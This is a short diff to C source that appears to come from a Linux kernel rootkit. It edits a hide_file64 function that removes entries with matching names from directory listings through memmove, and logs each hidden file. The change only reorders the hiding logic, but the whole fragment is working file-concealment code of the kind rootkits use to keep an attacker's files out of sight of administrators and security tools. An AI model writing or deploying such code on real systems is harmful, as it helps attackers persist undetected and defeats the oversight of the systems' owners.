@@ -71,20 +71,18 @@ static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long c
 {
     struct linux_dirent64 *dp;
     long cur_addr, cur_reclen, size, next_addr;
-    char *ptr;
     
     for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
         dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
         
         if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
-            cur_reclen = dp->d_reclen;                              // Store the current length
-            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
-            size = (unsigned long)dirp + count - next_addr;         // Remain size = initial+size-next size
-            
-            memmove(dp, (void *)next_addr, size);                   // current dirent point to the next
-            count -= cur_reclen;                                    // Modify the size
-            
             printk("Hide %s file success.\n", dp->d_name);
+            
+            cur_reclen = dp->d_reclen;                              // Store the current dirent length
+            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
+            
+            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
+            count -= cur_reclen;                                    // Modify the count
         }
     }
 
